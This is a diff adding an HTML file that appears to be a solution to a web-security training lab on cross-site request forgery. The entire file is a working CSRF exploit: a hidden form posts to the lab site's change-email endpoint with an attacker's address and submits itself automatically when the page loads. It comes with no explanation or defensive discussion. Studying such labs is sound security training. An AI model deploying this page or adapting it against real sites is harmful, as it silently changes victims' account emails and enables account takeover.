@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en" xml:lang="en">
+
+<head>
+    <title>CSRF vulnerability with no defenses</title>
+</head>
+
+<body>
+    <form action="https://INSTANCEID.web-security-academy.net/my-account/change-email" method="POST">
+        <input type="hidden" name="email" value="pwned@evil-user.net" />
+    </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+</body>
+
+</html>
